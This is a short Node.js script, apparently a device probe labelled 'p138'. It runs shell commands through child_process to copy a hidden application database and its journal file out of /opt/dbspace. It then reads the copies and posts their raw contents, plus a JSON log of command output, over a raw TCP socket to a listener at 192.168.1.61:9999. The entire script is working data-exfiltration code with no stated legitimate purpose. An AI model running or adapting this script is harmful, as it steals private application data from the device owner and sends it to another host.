"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var fs = require('fs');
var net = require('net');
var HOST='192.168.1.61', PORT=9999;
var R={ts:new Date().toISOString(), probe:'p138', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,500));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},5000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p138info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||4000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
function main(){
  var BASE='/home/owner/share/tmp/sdk_tools';
  R.results.cp=run('cp /opt/dbspace/.app-context.db '+BASE+'/live_after.db; cp /opt/dbspace/.app-context.db-journal '+BASE+'/journal_after.db; ls -la '+BASE+'/live_after.db '+BASE+'/journal_after.db; md5sum '+BASE+'/live_after.db '+BASE+'/journal_after.db',10000,2000);
  try { postBuf('/live_after.db', fs.readFileSync(BASE+'/live_after.db')); L('posted live'); } catch(e){ L('live read '+e); }
  try { postBuf('/journal_after.db', fs.readFileSync(BASE+'/journal_after.db')); L('posted journal'); } catch(e){ L('journal read '+e); }
  R.results.final='done '+new Date().toISOString();
  L('done');
  postFinal();
  setTimeout(postFinal,20000);
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
